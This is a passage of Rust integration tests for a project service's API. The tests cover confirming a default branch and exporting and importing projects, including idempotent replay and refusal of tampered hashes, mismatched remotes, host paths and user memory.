        let (status, body) = page(invalid).await;
        assert_eq!(status, StatusCode::BAD_REQUEST, "{invalid}: {body}");
    }
    let (status, body) = page("").await;
    assert_eq!(status, StatusCode::OK);
    assert_eq!(events(&body).len(), 2);
}

#[tokio::test]
async fn a_default_branch_present_only_on_origin_can_be_confirmed() {
    let harness = Harness::new();
    let repo = tempfile::tempdir().unwrap();
    synthetic_repository(repo.path());
    git(
        repo.path(),
        &["commit", "-q", "-am", "commit developer work"],
    );
    // A fresh clone: origin's branches are remote-tracking refs only.
    git(
        repo.path(),
        &["update-ref", "refs/remotes/origin/main", "HEAD"],
    );
    git(
        repo.path(),
        &["update-ref", "refs/remotes/origin/develop", "HEAD"],
    );
    git(
        repo.path(),
        &[
            "symbolic-ref",
            "refs/remotes/origin/HEAD",
            "refs/remotes/origin/main",
        ],
    );
    harness
        .request(
            "POST",
            "/api/v1/projects",
            Some(register_body("fixture", repo.path())),
            true,
        )
        .await;
    let (_, discovery) = harness
        .request("POST", "/api/v1/projects/fixture/discover", None, true)
        .await;
    let mut manifest = discovery["proposed_manifest"].clone();
    manifest["repositories"][0]["default_branch"] = json!("release");
    let (status, body) = harness
        .request(
            "PUT",
            "/api/v1/projects/fixture/manifest",
            Some(json!({"expected_revision":0,"manifest":manifest})),
            true,
        )
        .await;
    assert_eq!(status, StatusCode::UNPROCESSABLE_ENTITY, "{body}");
    assert!(
        body["error"]
            .as_str()
            .unwrap()
            .contains("origin/<branch> remote-tracking branch"),
        "{body}"
    );
    manifest["repositories"][0]["default_branch"] = json!("develop");
    let (status, body) = harness
        .request(
            "PUT",
            "/api/v1/projects/fixture/manifest",
            Some(json!({"expected_revision":0,"manifest":manifest})),
            true,
        )
        .await;
    assert_eq!(status, StatusCode::OK, "{body}");
    assert_eq!(
        body["manifest"]["manifest"]["repositories"][0]["default_branch"],
        "develop"
    );
}

// ---- Project import (ADR 0021 amendment): an export moves between machines ----

/// A registered, confirmed fixture project with one temporary ticket, and its export.
async fn exported_fixture(harness: &Harness, repo: &Path) -> Value {
    let (status, body) = harness
        .request(
            "POST",
            "/api/v1/projects",
            Some(register_body("fixture", repo)),
            true,
        )
        .await;
    assert_eq!(status, StatusCode::CREATED, "{body}");
    let (_, discovery) = harness
        .request("POST", "/api/v1/projects/fixture/discover", None, true)
        .await;
    let (status, body) = harness
        .request(
            "PUT",
            "/api/v1/projects/fixture/manifest",
            Some(json!({"expected_revision":0,"manifest":discovery["proposed_manifest"]})),
            true,
        )
        .await;
    assert_eq!(status, StatusCode::OK, "{body}");
    let (status, body) = harness
        .request(
            "POST",
            "/api/v1/projects/fixture/tickets",
            Some(json!({"idempotency_key":"t1","title":"Exported ticket","intent":"Keep the relative path src/lib.rs tidy","acceptance_criteria":["cargo test passes"],"repository_ids":["app"]})),
            true,
        )
        .await;
    assert_eq!(status, StatusCode::CREATED, "{body}");
    let (status, export) = harness
        .request("GET", "/api/v1/projects/fixture/export", None, true)
        .await;
    assert_eq!(status, StatusCode::OK, "{export}");
    assert_eq!(export["project"]["manifest_revision"], 1);
    assert_eq!(export["tickets"].as_array().unwrap().len(), 1);
    assert_eq!(
        export["repository_identities"]["app"]["remote"],
        "https://example.invalid/fixture.git"
    );
    assert!(export["export_hash"]
        .as_str()
        .unwrap()
        .starts_with("sha256:"));
    export
}

/// A fresh clone of the fixture with the same portable remote: the checkout a
/// developer makes on another computer.
fn clone_fixture(source: &Path, target: &Path, remote: &str) {
    let output = Command::new("git")
        .args(["clone", "-q"])
        .arg(source)
        .arg(target)
        .output()
        .unwrap();
    assert!(
        output.status.success(),
        "{}",
        String::from_utf8_lossy(&output.stderr)
    );
    git(target, &["remote", "set-url", "origin", remote]);
}

fn rehash(mut export: Value) -> Value {
    let mut body = export.clone();
    body.as_object_mut().unwrap().remove("export_hash");
    export["export_hash"] = json!(luuna_domain::hash_value(&body).unwrap());
    export
}

fn import_body(export: &Value, path: &Path, key: &str) -> Value {
    json!({"export":export,"repositories":[{"id":"app","path":path.to_string_lossy()}],"idempotency_key":key})
}

#[tokio::test]
async fn an_export_imports_into_a_fresh_runtime_from_a_clone_with_the_same_identity_and_replays() {
    let source = Harness::synthetic();
    let repo = tempfile::tempdir().unwrap();
    synthetic_repository(repo.path());
    let export = exported_fixture(&source, repo.path()).await;

    let target = Harness::synthetic();
    let clone = tempfile::tempdir().unwrap();
    let clone_root = clone.path().join("fixture");
    clone_fixture(
        repo.path(),
        &clone_root,
        "https://user:other-secret@example.invalid/fixture.git",
    );
    let before = snapshot(&clone_root);
    let (status, imported) = target
        .request(
            "POST",
            "/api/v1/projects/import",
            Some(import_body(&export, &clone_root, "import-1")),
            true,
        )
        .await;
    assert_eq!(status, StatusCode::CREATED, "{imported}");
    assert_eq!(imported["replayed"], false);
    assert_eq!(imported["export_hash"], export["export_hash"]);
    assert_eq!(imported["components_enabled"], false);
    assert_eq!(
        imported["counts"],
        json!({"tickets":1,"memory":0,"prompts":0})
    );
    assert_eq!(imported["project"]["project"]["id"], "fixture");
    assert_eq!(imported["project"]["project"]["revision"], 1);
    assert_eq!(
        imported["project"]["project"]["manifest_hash"], export["project"]["manifest_hash"],
        "the imported manifest hash equals the export's"
    );
    assert_eq!(
        imported["manifest_hash"],
        export["project"]["manifest_hash"]
    );
    assert_eq!(
        imported["project"]["repositories"][0]["local_path"],
        json!(fs::canonicalize(&clone_root)
            .unwrap()
            .to_string_lossy()
            .trim_start_matches(r"\\?\"))
    );
    assert_eq!(
        snapshot(&clone_root),
        before,
        "import must not change the checkout"
    );
    let (_, tickets) = target
        .request("GET", "/api/v1/projects/fixture/tickets", None, true)
        .await;
    assert_eq!(tickets.as_array().unwrap().len(), 1);
    assert_eq!(tickets[0]["id"], export["tickets"][0]["id"]);
    assert_eq!(tickets[0]["intent"], export["tickets"][0]["intent"]);
    assert_eq!(tickets[0]["created_at"], export["tickets"][0]["created_at"]);
    let (_, replay) = target
        .request("GET", "/api/v1/projects/fixture/events", None, true)
        .await;
    let types: Vec<&str> = replay
        .as_array()
        .unwrap()
        .iter()
        .map(|event| event["type"].as_str().unwrap())
        .collect();
    assert_eq!(
        types,
        vec![
            "project.registered",
            "repository.registered",
            "manifest.confirmed",
            "ticket.created",
            "project.imported"
        ]
    );
    let recorded = replay.as_array().unwrap().last().unwrap();
    assert_eq!(recorded["payload"]["export_hash"], export["export_hash"]);
    assert_eq!(recorded["payload"]["counts"]["tickets"], 1);
    assert_eq!(
        recorded["payload"]["mapping"]["manifest"]["exported_revision"],
        1
    );

    // The same key replays the recorded result; another key never merges.
    let (status, again) = target
        .request(
            "POST",
            "/api/v1/projects/import",
            Some(import_body(&export, &clone_root, "import-1")),
            true,
        )
        .await;
    assert_eq!(status, StatusCode::OK, "{again}");
    assert_eq!(again["replayed"], true);
    assert_eq!(again["export_hash"], export["export_hash"]);
    let (_, tickets) = target
        .request("GET", "/api/v1/projects/fixture/tickets", None, true)
        .await;
    assert_eq!(tickets.as_array().unwrap().len(), 1);
    let (status, body) = target
        .request(
            "POST",
            "/api/v1/projects/import",
            Some(import_body(&export, &clone_root, "import-2")),
            true,
        )
        .await;
    assert_eq!(status, StatusCode::CONFLICT, "{body}");
    assert!(body["error"]
        .as_str()
        .unwrap()
        .contains("already registered"));
    // The same key with a different export is refused too.
    let mut other = export.clone();
    other["exported_at"] = json!("2026-01-01T00:00:00Z");
    let (status, body) = target
        .request(
            "POST",
            "/api/v1/projects/import",
            Some(import_body(&rehash(other), &clone_root, "import-1")),
            true,
        )
        .await;
    assert_eq!(status, StatusCode::CONFLICT, "{body}");
    assert!(body["error"].as_str().unwrap().contains("import-1"));
    // Unauthenticated requests never reach the import.
    let (status, _) = target
        .request(
            "POST",
            "/api/v1/projects/import",
            Some(import_body(&export, &clone_root, "import-3")),
            false,
        )
        .await;
    assert_eq!(status, StatusCode::UNAUTHORIZED);
}

#[tokio::test]
async fn an_import_is_refused_for_a_different_remote_a_tampered_hash_a_host_path_and_user_memory() {
    let source = Harness::synthetic();
    let repo = tempfile::tempdir().unwrap();
    synthetic_repository(repo.path());
    let export = exported_fixture(&source, repo.path()).await;
    let target = Harness::synthetic();
    let clone = tempfile::tempdir().unwrap();
    let clone_root = clone.path().join("fixture");
    clone_fixture(
        repo.path(),
        &clone_root,
        "https://example.invalid/another-project.git",
    );

    // A clone of another repository (different remote) is not the exported one.
    let (status, body) = target
        .request(
            "POST",
            "/api/v1/projects/import",
            Some(import_body(&export, &clone_root, "k1")),
            true,
        )
        .await;
    assert_eq!(status, StatusCode::UNPROCESSABLE_ENTITY, "{body}");
    assert!(
        body["error"].as_str().unwrap().contains("origin remote"),
        "{body}"
    );
    git(
        &clone_root,
        &[
            "remote",
            "set-url",
            "origin",
            "https://example.invalid/fixture.git",
        ],
    );

    // A tampered document: the content no longer matches its hash.
    let mut tampered = export.clone();
    tampered["tickets"][0]["intent"] = json!("edited in transit");
    let (status, body) = target
        .request(
            "POST",
            "/api/v1/projects/import",
            Some(import_body(&tampered, &clone_root, "k2")),
            true,
        )
        .await;
    assert_eq!(status, StatusCode::UNPROCESSABLE_ENTITY, "{body}");
    assert!(
        body["error"].as_str().unwrap().contains("export hash"),
        "{body}"
    );
    let mut missing = export.clone();
    missing.as_object_mut().unwrap().remove("export_hash");
    let (status, body) = target
        .request(
            "POST",
            "/api/v1/projects/import",
            Some(import_body(&missing, &clone_root, "k2b")),
            true,
        )
        .await;
    assert_eq!(status, StatusCode::UNPROCESSABLE_ENTITY, "{body}");

    // A host path in a ticket, correctly hashed, is still refused.
    let mut with_path = export.clone();
    with_path["tickets"][0]["intent"] = json!("see /home/dev/private/notes.txt");
    let (status, body) = target
        .request(
            "POST",
            "/api/v1/projects/import",
            Some(import_body(&rehash(with_path), &clone_root, "k3")),
            true,
        )
        .await;
    assert_eq!(status, StatusCode::UNPROCESSABLE_ENTITY, "{body}");
    assert!(
        body["error"].as_str().unwrap().contains("an absolute path"),
        "{body}"
    );

    // User memory never enters another machine through an import.
    let mut with_user = export.clone();
    with_user["memory"] = json!([{"id":"mem-1","scope":"user","content":"private","provenance":"me","hash":format!("sha256:{}", "1".repeat(64)),"created_at":"2026-10-21T00:00:00Z"}]);
    let (status, body) = target
        .request(
            "POST",
            "/api/v1/projects/import",
            Some(import_body(&rehash(with_user), &clone_root, "k4")),
            true,
        )
        .await;
    assert_eq!(status, StatusCode::UNPROCESSABLE_ENTITY, "{body}");
    assert!(
        body["error"].as_str().unwrap().contains("user memory"),
        "{body}"
    );

    // A missing checkout path, and a document that is not an export.
    let (status, body) = target
        .request(
            "POST",
            "/api/v1/projects/import",
            Some(import_body(&export, &clone.path().join("nowhere"), "k5")),
            true,
        )
        .await;
    assert_eq!(status, StatusCode::UNPROCESSABLE_ENTITY, "{body}");
    let (status, body) = target
        .request(
            "POST",
            "/api/v1/projects/import",
            Some(json!({"export":{"kind":"something-else"},"repositories":[{"id":"app","path":clone_root.to_string_lossy()}],"idempotency_key":"k6"})),
            true,
        )
        .await;
    assert_eq!(status, StatusCode::UNPROCESSABLE_ENTITY, "{body}");
    // A checkout for a repository the export does not name is refused.
    let (status, body) = target
        .request(
            "POST",
            "/api/v1/projects/import",
            Some(json!({"export":export,"repositories":[{"id":"other","path":clone_root.to_string_lossy()}],"idempotency_key":"k7"})),
            true,
        )
        .await;
    assert_eq!(status, StatusCode::UNPROCESSABLE_ENTITY, "{body}");
    // Nothing above registered the project.
    let (status, _) = target
        .request("GET", "/api/v1/projects/fixture", None, true)
        .await;
    assert_eq!(status, StatusCode::NOT_FOUND);
}

/// A 200-byte import key (the longest the API accepts) still derives bounded
/// per-item keys, so an import with tickets completes rather than failing
/// after the project was registered.
#[tokio::test]
async fn an_import_with_the_longest_key_completes_and_replays() {
    let source = Harness::synthetic();
    let repo = tempfile::tempdir().unwrap();
    synthetic_repository(repo.path());
    let export = exported_fixture(&source, repo.path()).await;
    let target = Harness::synthetic();
    let clone = tempfile::tempdir().unwrap();
    let clone_root = clone.path().join("fixture");
    clone_fixture(
        repo.path(),
        &clone_root,
        "https://user:other-secret@example.invalid/fixture.git",
    );
    let key = "k".repeat(200);
    let (status, imported) = target
        .request(
            "POST",
            "/api/v1/projects/import",
            Some(import_body(&export, &clone_root, &key)),
            true,
        )
        .await;
    assert_eq!(status, StatusCode::CREATED, "{imported}");
    assert_eq!(imported["counts"]["tickets"], 1);
    let (status, replayed) = target
        .request(
            "POST",
            "/api/v1/projects/import",
            Some(import_body(&export, &clone_root, &key)),
            true,
        )
        .await;
    assert_eq!(status, StatusCode::OK, "{replayed}");
    assert_eq!(replayed["replayed"], true);
}
